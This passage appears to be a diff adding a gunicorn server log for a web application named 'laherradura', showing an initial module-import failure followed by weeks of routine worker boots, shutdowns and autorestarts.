+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/wsgiapp.py", line 47, in load_wsgiapp
+    return util.import_app(self.app_uri)
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/util.py", line 370, in import_app
+    mod = importlib.import_module(module)
+  File "/usr/lib/python3.10/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 1050, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 992, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 241, in _call_with_frames_removed
+  File "<frozen importlib._bootstrap>", line 1050, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 1004, in _find_and_load_unlocked
+ModuleNotFoundError: No module named 'laherradura'
+[2024-12-20 10:00:11 -0300] [5613] [INFO] Worker exiting (pid: 5613)
+[2024-12-20 10:00:11 -0300] [5612] [ERROR] Worker (pid:5613) exited with code 3
+[2024-12-20 10:00:11 -0300] [5612] [ERROR] Shutting down: Master
+[2024-12-20 10:00:11 -0300] [5612] [ERROR] Reason: Worker failed to boot.
+[2024-12-20 10:00:11 -0300] [5614] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 10:00:11 -0300] [5614] [INFO] Listening at: unix:/var/www/laherradura/fherradurafinal2/laherradura.sock (5614)
+[2024-12-20 10:00:11 -0300] [5614] [INFO] Using worker: sync
+[2024-12-20 10:00:11 -0300] [5615] [INFO] Booting worker with pid: 5615
+[2024-12-20 10:00:11 -0300] [5615] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/arbiter.py", line 608, in spawn_worker
+    worker.init_process()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/workers/base.py", line 135, in init_process
+    self.load_wsgi()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/workers/base.py", line 147, in load_wsgi
+    self.wsgi = self.app.wsgi()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/base.py", line 66, in wsgi
+    self.callable = self.load()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/wsgiapp.py", line 57, in load
+    return self.load_wsgiapp()
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/app/wsgiapp.py", line 47, in load_wsgiapp
+    return util.import_app(self.app_uri)
+  File "/usr/local/lib/python3.10/dist-packages/gunicorn/util.py", line 370, in import_app
+    mod = importlib.import_module(module)
+  File "/usr/lib/python3.10/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 1050, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 992, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 241, in _call_with_frames_removed
+  File "<frozen importlib._bootstrap>", line 1050, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 1004, in _find_and_load_unlocked
+ModuleNotFoundError: No module named 'laherradura'
+[2024-12-20 10:00:11 -0300] [5615] [INFO] Worker exiting (pid: 5615)
+[2024-12-20 10:00:11 -0300] [5614] [ERROR] Worker (pid:5615) exited with code 3
+[2024-12-20 10:00:11 -0300] [5614] [ERROR] Shutting down: Master
+[2024-12-20 10:00:11 -0300] [5614] [ERROR] Reason: Worker failed to boot.
+[2024-12-20 10:06:44 -0300] [5782] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 10:06:44 -0300] [5782] [INFO] Listening at: unix:/var/www/laherradura/fherradurafinal2/laherradura.sock (5782)
+[2024-12-20 10:06:44 -0300] [5782] [INFO] Using worker: sync
+[2024-12-20 10:06:44 -0300] [5783] [INFO] Booting worker with pid: 5783
+[2024-12-20 10:06:44 -0300] [5784] [INFO] Booting worker with pid: 5784
+[2024-12-20 10:07:55 -0300] [5782] [INFO] Handling signal: term
+[2024-12-20 10:07:55 -0300] [5784] [INFO] Worker exiting (pid: 5784)
+[2024-12-20 10:07:55 -0300] [5783] [INFO] Worker exiting (pid: 5783)
+[2024-12-20 10:07:55 -0300] [5782] [INFO] Shutting down: Master
+[2024-12-20 10:07:59 -0300] [3140] [INFO] Handling signal: term
+[2024-12-20 10:07:59 -0300] [3145] [INFO] Worker exiting (pid: 3145)
+[2024-12-20 10:07:59 -0300] [3146] [INFO] Worker exiting (pid: 3146)
+[2024-12-20 10:07:59 -0300] [3140] [ERROR] Worker (pid:3146) exited with code 120
+[2024-12-20 10:07:59 -0300] [3140] [ERROR] Worker (pid:3146) exited with code 120.
+[2024-12-20 10:07:59 -0300] [3140] [ERROR] Worker (pid:3145) exited with code 120
+[2024-12-20 10:07:59 -0300] [3140] [ERROR] Worker (pid:3145) exited with code 120.
+[2024-12-20 10:08:00 -0300] [3140] [INFO] Shutting down: Master
+[2024-12-20 10:12:42 -0300] [5871] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 10:12:42 -0300] [5871] [INFO] Listening at: unix:/var/www/laherradura/fherradurafinal2/laherradura.sock (5871)
+[2024-12-20 10:12:42 -0300] [5871] [INFO] Using worker: sync
+[2024-12-20 10:12:42 -0300] [5872] [INFO] Booting worker with pid: 5872
+[2024-12-20 10:12:42 -0300] [5873] [INFO] Booting worker with pid: 5873
+[2024-12-20 10:13:27 -0300] [5872] [INFO] Worker exiting (pid: 5872)
+[2024-12-20 10:13:27 -0300] [5871] [INFO] Handling signal: term
+[2024-12-20 10:13:27 -0300] [5873] [INFO] Worker exiting (pid: 5873)
+[2024-12-20 10:13:27 -0300] [5871] [ERROR] Worker (pid:5872) was sent SIGTERM!
+[2024-12-20 10:13:27 -0300] [5871] [INFO] Shutting down: Master
+[2024-12-20 10:13:44 -0300] [5900] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 10:13:44 -0300] [5900] [INFO] Listening at: unix:/var/www/laherradura/fherradurafinal2/laherradura.sock (5900)
+[2024-12-20 10:13:44 -0300] [5900] [INFO] Using worker: sync
+[2024-12-20 10:13:44 -0300] [5901] [INFO] Booting worker with pid: 5901
+[2024-12-20 10:13:44 -0300] [5902] [INFO] Booting worker with pid: 5902
+[2024-12-20 10:21:46 -0300] [5901] [INFO] Worker exiting (pid: 5901)
+[2024-12-20 10:21:46 -0300] [5902] [INFO] Worker exiting (pid: 5902)
+[2024-12-20 10:21:46 -0300] [5900] [INFO] Handling signal: term
+[2024-12-20 10:21:46 -0300] [5900] [ERROR] Worker (pid:5902) was sent SIGTERM!
+[2024-12-20 10:21:46 -0300] [5900] [ERROR] Worker (pid:5901) was sent SIGTERM!
+[2024-12-20 10:21:46 -0300] [5900] [INFO] Shutting down: Master
+[2024-12-20 10:21:55 -0300] [6062] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 10:21:55 -0300] [6062] [INFO] Listening at: unix:/var/www/laherradura/fherradurafinal2/laherradura.sock (6062)
+[2024-12-20 10:21:55 -0300] [6062] [INFO] Using worker: sync
+[2024-12-20 10:21:55 -0300] [6063] [INFO] Booting worker with pid: 6063
+[2024-12-20 10:21:55 -0300] [6064] [INFO] Booting worker with pid: 6064
+[2024-12-20 10:27:39 -0300] [6063] [INFO] Worker exiting (pid: 6063)
+[2024-12-20 10:27:39 -0300] [6062] [INFO] Handling signal: term
+[2024-12-20 10:27:39 -0300] [6064] [INFO] Worker exiting (pid: 6064)
+[2024-12-20 10:27:39 -0300] [6062] [ERROR] Worker (pid:6063) was sent SIGTERM!
+[2024-12-20 10:27:39 -0300] [6062] [INFO] Shutting down: Master
+[2024-12-20 10:27:39 -0300] [6164] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 10:27:39 -0300] [6164] [INFO] Listening at: unix:/var/www/laherradura/fherradurafinal2/laherradura.sock (6164)
+[2024-12-20 10:27:39 -0300] [6164] [INFO] Using worker: sync
+[2024-12-20 10:27:39 -0300] [6165] [INFO] Booting worker with pid: 6165
+[2024-12-20 10:27:39 -0300] [6166] [INFO] Booting worker with pid: 6166
+[2024-12-20 10:34:51 -0300] [6165] [INFO] Worker exiting (pid: 6165)
+[2024-12-20 10:34:51 -0300] [6164] [INFO] Handling signal: term
+[2024-12-20 10:34:51 -0300] [6166] [INFO] Worker exiting (pid: 6166)
+[2024-12-20 10:34:51 -0300] [6164] [ERROR] Worker (pid:6165) was sent SIGTERM!
+[2024-12-20 10:34:51 -0300] [6164] [ERROR] Worker (pid:6166) was sent SIGTERM!
+[2024-12-20 10:34:51 -0300] [6164] [INFO] Shutting down: Master
+[2024-12-20 10:35:09 -0300] [6295] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 10:35:09 -0300] [6295] [INFO] Listening at: unix:/var/www/laherradura/fherradurafinal2/laherradura.sock (6295)
+[2024-12-20 10:35:09 -0300] [6295] [INFO] Using worker: sync
+[2024-12-20 10:35:09 -0300] [6296] [INFO] Booting worker with pid: 6296
+[2024-12-20 10:35:09 -0300] [6297] [INFO] Booting worker with pid: 6297
+[2024-12-20 11:02:19 -0300] [8544] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 11:02:19 -0300] [8544] [INFO] Listening at: unix:/var/www/laherradura/fherradurafinal2/laherradura.sock (8544)
+[2024-12-20 11:02:19 -0300] [8544] [INFO] Using worker: sync
+[2024-12-20 11:02:19 -0300] [8545] [INFO] Booting worker with pid: 8545
+[2024-12-20 11:02:19 -0300] [8546] [INFO] Booting worker with pid: 8546
+[2024-12-20 14:24:27 -0300] [8545] [INFO] Worker exiting (pid: 8545)
+[2024-12-20 14:24:27 -0300] [8546] [INFO] Worker exiting (pid: 8546)
+[2024-12-20 14:24:27 -0300] [8544] [INFO] Handling signal: term
+[2024-12-20 14:24:27 -0300] [8544] [ERROR] Worker (pid:8545) was sent SIGTERM!
+[2024-12-20 14:24:27 -0300] [8544] [ERROR] Worker (pid:8546) was sent SIGTERM!
+[2024-12-20 14:24:27 -0300] [8544] [INFO] Shutting down: Master
+[2024-12-20 14:24:27 -0300] [9206] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 14:24:27 -0300] [9206] [INFO] Listening at: unix:/var/www/laherradura/fherradurafinal2/laherradura.sock (9206)
+[2024-12-20 14:24:27 -0300] [9206] [INFO] Using worker: sync
+[2024-12-20 14:24:27 -0300] [9209] [INFO] Booting worker with pid: 9209
+[2024-12-20 14:24:27 -0300] [9210] [INFO] Booting worker with pid: 9210
+[2024-12-20 14:29:25 -0300] [9209] [INFO] Worker exiting (pid: 9209)
+[2024-12-20 14:29:25 -0300] [9206] [INFO] Handling signal: term
+[2024-12-20 14:29:25 -0300] [9210] [INFO] Worker exiting (pid: 9210)
+[2024-12-20 14:29:25 -0300] [9206] [ERROR] Worker (pid:9209) was sent SIGTERM!
+[2024-12-20 14:29:25 -0300] [9206] [INFO] Shutting down: Master
+[2024-12-20 14:29:25 -0300] [9254] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 14:29:25 -0300] [9254] [INFO] Listening at: unix:/var/www/laherradura/fherradurafinal2/laherradura.sock (9254)
+[2024-12-20 14:29:25 -0300] [9254] [INFO] Using worker: sync
+[2024-12-20 14:29:25 -0300] [9255] [INFO] Booting worker with pid: 9255
+[2024-12-20 14:29:25 -0300] [9256] [INFO] Booting worker with pid: 9256
+[2024-12-20 14:44:43 -0300] [9255] [INFO] Worker exiting (pid: 9255)
+[2024-12-20 14:44:43 -0300] [9256] [INFO] Worker exiting (pid: 9256)
+[2024-12-20 14:44:44 -0300] [9254] [INFO] Handling signal: term
+[2024-12-20 14:44:44 -0300] [9254] [ERROR] Worker (pid:9256) was sent SIGTERM!
+[2024-12-20 14:44:44 -0300] [9254] [ERROR] Worker (pid:9255) was sent SIGTERM!
+[2024-12-20 14:44:44 -0300] [9254] [INFO] Shutting down: Master
+[2024-12-20 14:44:44 -0300] [9517] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 14:44:44 -0300] [9517] [INFO] Listening at: unix:/var/www/laherradura/fherradurafinal2/laherradura.sock (9517)
+[2024-12-20 14:44:44 -0300] [9517] [INFO] Using worker: sync
+[2024-12-20 14:44:44 -0300] [9519] [INFO] Booting worker with pid: 9519
+[2024-12-20 14:44:44 -0300] [9520] [INFO] Booting worker with pid: 9520
+[2024-12-20 14:53:48 -0300] [9519] [INFO] Worker exiting (pid: 9519)
+[2024-12-20 14:53:48 -0300] [9520] [INFO] Worker exiting (pid: 9520)
+[2024-12-20 14:53:48 -0300] [9517] [INFO] Handling signal: term
+[2024-12-20 14:53:48 -0300] [9517] [ERROR] Worker (pid:9520) was sent SIGTERM!
+[2024-12-20 14:53:48 -0300] [9517] [ERROR] Worker (pid:9519) was sent SIGTERM!
+[2024-12-20 14:53:48 -0300] [9517] [INFO] Shutting down: Master
+[2024-12-20 14:53:48 -0300] [9546] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 14:53:48 -0300] [9546] [INFO] Listening at: unix:/var/www/laherradura/fherradurafinal2/laherradura.sock (9546)
+[2024-12-20 14:53:48 -0300] [9546] [INFO] Using worker: sync
+[2024-12-20 14:53:48 -0300] [9548] [INFO] Booting worker with pid: 9548
+[2024-12-20 14:53:48 -0300] [9549] [INFO] Booting worker with pid: 9549
+[2024-12-20 20:27:23 -0300] [9548] [INFO] Worker exiting (pid: 9548)
+[2024-12-20 20:27:23 -0300] [9546] [INFO] Handling signal: term
+[2024-12-20 20:27:23 -0300] [9549] [INFO] Worker exiting (pid: 9549)
+[2024-12-20 20:27:23 -0300] [9546] [ERROR] Worker (pid:9548) was sent SIGTERM!
+[2024-12-20 20:27:23 -0300] [9546] [ERROR] Worker (pid:9549) was sent SIGTERM!
+[2024-12-20 20:27:23 -0300] [9546] [INFO] Shutting down: Master
+[2024-12-20 20:27:23 -0300] [10276] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 20:27:23 -0300] [10276] [INFO] Listening at: unix:/var/www/laherradura/fherradurafinal2/laherradura.sock (10276)
+[2024-12-20 20:27:23 -0300] [10276] [INFO] Using worker: sync
+[2024-12-20 20:27:23 -0300] [10277] [INFO] Booting worker with pid: 10277
+[2024-12-20 20:27:24 -0300] [10278] [INFO] Booting worker with pid: 10278
+[2024-12-21 21:06:23 -0300] [10276] [ERROR] Worker (pid:10278) was sent SIGKILL! Perhaps out of memory?
+[2024-12-21 21:06:23 -0300] [10277] [INFO] Worker exiting (pid: 10277)
+[2024-12-21 21:06:23 -0300] [23106] [INFO] Booting worker with pid: 23106
+[2024-12-21 21:06:23 -0300] [10276] [INFO] Handling signal: term
+[2024-12-21 21:06:23 -0300] [10276] [ERROR] Worker (pid:10277) was sent SIGTERM!
+[2024-12-21 21:06:37 -0300] [23106] [INFO] Worker exiting (pid: 23106)
+[2024-12-21 21:06:37 -0300] [10276] [INFO] Shutting down: Master
+[2024-12-21 21:32:55 -0300] [23182] [INFO] Starting gunicorn 23.0.0
+[2024-12-21 21:32:55 -0300] [23182] [INFO] Listening at: unix:/var/www/laherradura/fherradurafinal2/laherradura.sock (23182)
+[2024-12-21 21:32:55 -0300] [23182] [INFO] Using worker: sync
+[2024-12-21 21:32:55 -0300] [23183] [INFO] Booting worker with pid: 23183
+[2024-12-21 21:32:55 -0300] [23184] [INFO] Booting worker with pid: 23184
+[2024-12-23 13:22:43 -0300] [23184] [INFO] Autorestarting worker after current request.
+[2024-12-23 13:22:43 -0300] [23184] [INFO] Worker exiting (pid: 23184)
+[2024-12-23 13:22:44 -0300] [29397] [INFO] Booting worker with pid: 29397
+[2024-12-23 13:26:45 -0300] [23183] [INFO] Autorestarting worker after current request.
+[2024-12-23 13:26:45 -0300] [23183] [INFO] Worker exiting (pid: 23183)
+[2024-12-23 13:26:46 -0300] [29401] [INFO] Booting worker with pid: 29401
+[2024-12-24 20:59:19 -0300] [29397] [INFO] Autorestarting worker after current request.
+[2024-12-24 20:59:19 -0300] [29397] [INFO] Worker exiting (pid: 29397)
+[2024-12-24 20:59:20 -0300] [33781] [INFO] Booting worker with pid: 33781
+[2024-12-25 03:05:34 -0300] [29401] [INFO] Autorestarting worker after current request.
+[2024-12-25 03:05:34 -0300] [29401] [INFO] Worker exiting (pid: 29401)
+[2024-12-25 03:05:35 -0300] [34507] [INFO] Booting worker with pid: 34507
+[2024-12-27 01:35:04 -0300] [33781] [INFO] Autorestarting worker after current request.
+[2024-12-27 01:35:04 -0300] [33781] [INFO] Worker exiting (pid: 33781)
+[2024-12-27 01:35:06 -0300] [41383] [INFO] Booting worker with pid: 41383
+[2024-12-27 04:14:56 -0300] [34507] [INFO] Autorestarting worker after current request.
+[2024-12-27 04:14:56 -0300] [34507] [INFO] Worker exiting (pid: 34507)
+[2024-12-27 04:14:57 -0300] [41726] [INFO] Booting worker with pid: 41726
+[2024-12-29 07:43:09 -0300] [41383] [INFO] Autorestarting worker after current request.
+[2024-12-29 07:43:09 -0300] [41383] [INFO] Worker exiting (pid: 41383)
+[2024-12-29 07:43:10 -0300] [49831] [INFO] Booting worker with pid: 49831
+[2024-12-29 13:59:30 -0300] [41726] [INFO] Autorestarting worker after current request.
+[2024-12-29 13:59:30 -0300] [41726] [INFO] Worker exiting (pid: 41726)
+[2024-12-29 13:59:31 -0300] [50551] [INFO] Booting worker with pid: 50551
+[2024-12-31 22:49:04 -0300] [49831] [INFO] Autorestarting worker after current request.
+[2024-12-31 22:49:04 -0300] [49831] [INFO] Worker exiting (pid: 49831)
+[2024-12-31 22:49:07 -0300] [58553] [INFO] Booting worker with pid: 58553
+[2025-01-01 03:35:46 -0300] [50551] [INFO] Autorestarting worker after current request.
+[2025-01-01 03:35:46 -0300] [50551] [INFO] Worker exiting (pid: 50551)
+[2025-01-01 03:35:47 -0300] [59758] [INFO] Booting worker with pid: 59758
+[2025-01-06 13:14:36 -0300] [58553] [INFO] Autorestarting worker after current request.
+[2025-01-06 13:14:36 -0300] [58553] [INFO] Worker exiting (pid: 58553)
+[2025-01-06 13:14:37 -0300] [78535] [INFO] Booting worker with pid: 78535
+[2025-01-06 22:27:23 -0300] [59758] [INFO] Autorestarting worker after current request.
+[2025-01-06 22:27:23 -0300] [59758] [INFO] Worker exiting (pid: 59758)
+[2025-01-06 22:27:27 -0300] [79593] [INFO] Booting worker with pid: 79593
+[2025-01-12 01:54:00 -0300] [78535] [INFO] Autorestarting worker after current request.
+[2025-01-12 01:54:00 -0300] [78535] [INFO] Worker exiting (pid: 78535)
+[2025-01-12 01:54:07 -0300] [99776] [INFO] Booting worker with pid: 99776
+[2025-01-12 11:25:55 -0300] [79593] [INFO] Autorestarting worker after current request.
+[2025-01-12 11:25:55 -0300] [79593] [INFO] Worker exiting (pid: 79593)
+[2025-01-12 11:25:56 -0300] [100977] [INFO] Booting worker with pid: 100977
+[2025-01-15 09:46:37 -0300] [99776] [INFO] Autorestarting worker after current request.
+[2025-01-15 09:46:37 -0300] [99776] [INFO] Worker exiting (pid: 99776)
+[2025-01-15 09:46:38 -0300] [110771] [INFO] Booting worker with pid: 110771
+[2025-01-15 09:52:11 -0300] [100977] [INFO] Autorestarting worker after current request.
+[2025-01-15 09:52:11 -0300] [100977] [INFO] Worker exiting (pid: 100977)
+[2025-01-15 09:52:12 -0300] [110780] [INFO] Booting worker with pid: 110780
+[2025-01-15 11:45:15 -0300] [110771] [INFO] Autorestarting worker after current request.
+[2025-01-15 11:45:15 -0300] [110771] [INFO] Worker exiting (pid: 110771)
+[2025-01-15 11:45:15 -0300] [111031] [INFO] Booting worker with pid: 111031
+[2025-01-15 13:22:17 -0300] [110780] [INFO] Autorestarting worker after current request.
+[2025-01-15 13:22:17 -0300] [110780] [INFO] Worker exiting (pid: 110780)
+[2025-01-15 13:22:17 -0300] [111207] [INFO] Booting worker with pid: 111207
+[2025-01-15 18:38:56 -0300] [111031] [INFO] Autorestarting worker after current request.
+[2025-01-15 18:38:56 -0300] [111031] [INFO] Worker exiting (pid: 111031)
+[2025-01-15 18:38:57 -0300] [112451] [INFO] Booting worker with pid: 112451
+[2025-01-15 19:11:38 -0300] [111207] [INFO] Autorestarting worker after current request.
+[2025-01-15 19:11:38 -0300] [111207] [INFO] Worker exiting (pid: 111207)
+[2025-01-15 19:11:39 -0300] [112570] [INFO] Booting worker with pid: 112570
+[2025-01-15 20:48:50 -0300] [112451] [INFO] Autorestarting worker after current request.
+[2025-01-15 20:48:51 -0300] [112451] [INFO] Worker exiting (pid: 112451)
+[2025-01-15 20:48:53 -0300] [112969] [INFO] Booting worker with pid: 112969
+[2025-01-15 20:56:25 -0300] [112570] [INFO] Autorestarting worker after current request.
+[2025-01-15 20:56:25 -0300] [112570] [INFO] Worker exiting (pid: 112570)
+[2025-01-15 20:56:25 -0300] [112976] [INFO] Booting worker with pid: 112976
